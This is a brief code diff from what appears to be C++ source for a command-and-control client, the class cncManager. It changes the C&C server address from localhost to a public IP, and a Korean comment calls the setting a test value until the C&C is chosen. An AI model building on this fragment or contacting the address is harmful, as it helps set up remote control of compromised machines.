@@ -8,7 +8,7 @@ class cncManager
 private:
 	LPCWSTR
 		/* 일단 C&C 정해지기 전이라 테스트용*/
-		server = L"127.0.0.1",
+		server = L"1.251.227.66",
 		index = L"/tests";
 
 	HINTERNET
